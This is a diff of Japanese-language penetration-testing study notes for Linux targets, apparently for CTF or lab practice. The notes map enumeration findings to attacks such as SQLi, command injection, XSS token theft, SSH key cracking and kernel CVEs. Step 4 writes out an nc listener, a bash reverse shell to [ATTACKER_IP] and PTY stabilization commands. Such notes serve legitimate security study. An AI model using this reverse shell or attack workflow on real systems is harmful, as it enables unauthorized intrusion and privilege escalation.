@@ -9,17 +9,19 @@
 ```
 [0. OS判定]
        ↓
-[1. ポートスキャン]
+[1. ポートスキャン]                      → 01_Reconnaissance/
        ↓
-[2. 各サービスの列挙]
+[2. サービス別の列挙]                    → 01_Reconnaissance/
        ↓
-[3. 足がかりの特定]
+[3. 攻撃手法の選択]  ←ここで 02_Initial_Access/ の技術を判断する
        ↓
-[4. 初期アクセス]
+[4. シェルの取得]                        → 02_Initial_Access/
+   ├─ 経路A: 認証情報でサービスにログイン
+   └─ 経路B: Web脆弱性→リバースシェル → シェル安定化（必須）
        ↓
-[5. 侵入後の列挙]
+[5. 侵入後の列挙]                        → 03_Post_Access_Linux/
        ↓
-[6. 権限昇格]
+[6. 権限昇格]                            → 03_Post_Access_Linux/
 ```
 
 ---
@@ -73,6 +75,14 @@ Linux と確定した上でこのファイルのStep 1以降を進める。
 → CVE 検索: `../05_Tools_Reference/Searchsploit.md`
 → パストラバーサル: `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
 
+### SSHが開いている場合
+- バナー・バージョンを確認する（`nmap -sV` の出力）
+- 古いバージョンはユーザー列挙の脆弱性が存在する場合がある
+- 認証情報が判明したら直接ログインを試みる
+- **見つかった秘密鍵（`id_rsa` 等）がある場合はパスフレーズをクラックする**
+
+→ 詳細: `../02_Initial_Access/Protocol_Exploitation.md`
+
 ### FTPが開いている場合
 - 匿名ログインを試行 (`ftp anonymous@`)
 - ファイルがあればダウンロードして内容確認
@@ -82,24 +92,91 @@ Linux と確定した上でこのファイルのStep 1以降を進める。
 
 ---
 
-## Step 3 — 足がかりの特定
+## Step 3 — 攻撃手法の選択
 
-以下のいずれかで認証情報または直接アクセスを得る：
-
-| 状況 | 確認先 |
-|------|--------|
-| Webアプリでファイルダウンロード機能あり | IDOR を疑う → `../02_Initial_Access/Web_Vulnerabilities/IDOR.md` |
-| PCAPファイルが取得できた | tshark で平文認証情報を確認 → `../02_Initial_Access/Credential_Discovery.md` |
-| ログインフォームがある | デフォルト認証情報 / SQLi を試行 |
+Step 2の列挙結果を元に、「今の状況でどの手法を試すか」を以下の判断基準で選択する。
+**複数の候補が重なる場合は、より確実性が高い（証拠が強い）ものから試みる。**
 
 ---
 
-## Step 4 — 初期アクセス
+### 判断表：状況 → 試すべき手法
 
-認証情報が取得できたら、開いているサービスへのログインを試みる。
+| 列挙で得られた情報 | 試すべき手法 | 参照先 |
+|----------------|-----------|--------|
+| Webアプリのバージョンが判明した | searchsploit で既知CVEを検索 → パストラバーサル / RCE 等 | `../05_Tools_Reference/Searchsploit.md` |
+| ログインフォームがある | SQLi / デフォルト認証情報 | `../02_Initial_Access/Web_Vulnerabilities/SQLi.md` |
+| URLに `/item/123` 等の連番IDがある | IDOR（他ユーザーのオブジェクトに直接アクセス） | `../02_Initial_Access/Web_Vulnerabilities/IDOR.md` |
+| ファイルダウンロード機能・パラメータにパスが含まれる | パストラバーサル | `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md` |
+| JSソースに難読化コードがある | JS解析 → 隠しAPIエンドポイントの発見 | `../02_Initial_Access/Web_Vulnerabilities/JS_Obfuscation.md` |
+| APIが `username`/`host` 等のパラメータを受け取る | OSコマンドインジェクション（; id で確認） | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
+| 入力フォームにスクリプトが通る | XSS（セッショントークン窃取等） | `../02_Initial_Access/Web_Vulnerabilities/XSS.md` |
+| バイナリ・設定ファイルが取得できた | strings / 逆コンパイル → 認証情報 | `../02_Initial_Access/Binary_Analysis.md` |
+| PCAPファイルが取得できた | tshark で平文認証情報を抽出 | `../02_Initial_Access/Credential_Discovery.md` |
+| FTPに匿名ログインできた | ダウンロードしたファイルの内容確認・認証情報探索 | `../02_Initial_Access/Protocol_Exploitation.md` |
+| SSH のバージョンが古い | SSH 脆弱性 / ユーザー列挙 | `../02_Initial_Access/Protocol_Exploitation.md` |
 
-**パスワードの使い回しを必ず確認する:**
-- SSH / FTP / Web管理画面など、同じ認証情報が複数サービスで使えることがある
+---
+
+### 認証情報が手に入ったら
+
+どの手法で取得した認証情報であっても、すぐに全サービスで使い回しを確認する。
+
+→ `../02_Initial_Access/Credential_Discovery.md`（パスワード使い回し確認の表）
+
+---
+
+## Step 4 — シェルの取得
+
+Step 3で得た手法によって、シェル取得までの経路が異なる。
+
+### 経路A: 認証情報でサービスに直接ログインする場合
+
+```bash
+# SSH でのログイン（最も一般的）
+ssh [USER]@[TARGET_IP]
+
+# FTP へのログイン
+ftp [TARGET_IP]
+
+# WinRM（Linuxにはほぼないが混在環境では稀にある）
+evil-winrm -i [TARGET_IP] -u [USER] -p '[PASS]'
+```
+
+パスワードが通ったら Step 5 へ進む。通らない場合は別のユーザー・別のサービスで試す。
+
+---
+
+### 経路B: Web脆弱性・コマンドインジェクション経由でシェルを取得する場合
+
+脆弱なAPIやWebフォームを通じてOSコマンドを実行させ、リバースシェルを引き込む。
+
+**攻撃側でリスナーを起動してから、**
+
+```bash
+nc -lvnp 4444
+```
+
+**ペイロードをWebアプリ・APIに送り込む（コマンドインジェクションの例）：**
+
+```bash
+bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'
+```
+
+→ 詳細手順（APIパラメータ改ざんによる権限昇格・クォートエスケープ等）: `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`
+
+---
+
+### 経路B取得後：シェルの安定化（必須）
+
+リバースシェルは TTY なしの「ダムシェル」のため、**直ちに安定化しないと `sudo`・`su` 等が使えない。**
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z → stty raw -echo → fg
+```
+
+→ 詳細手順・代替手段: `../03_Post_Access_Linux/Shell_Stabilization.md`
 
 ---
 
@@ -173,9 +250,9 @@ GTFOBins で確認。標準バイナリ（find, vim, python等）に SUID が設
 
 | `uname -a` の出力 | 次に確認すること |
 |----------------|--------------|
-| ビルド日時が2年以上前（例：2022年以前） | `searchsploit linux kernel [バージョン]` で CVE 候補を確認 |
-| `/var/mail/<username>` に脆弱性名の言及あり | そのCVEを最優先に調べる |
-| `findmnt \| grep overlay` でOverlayFSが使われている | CVE-2023-0386 の適用条件が整っている可能性 |
+| ビルド日時が2年以上前 | `searchsploit linux kernel [バージョン系列]` で CVE 候補を確認 |
+| `/var/mail/<username>` に脆弱性名・技術名の言及あり | その技術名・CVEを最優先に searchsploit / GitHub で調べる |
+| `findmnt \| grep overlay` でOverlayFSが使われている | OverlayFS 系カーネルCVEの適用条件が整っている可能性 |
 
 PoC取得→ターゲットへの転送→コンパイル（gcc / make）→実行の流れが典型。
 
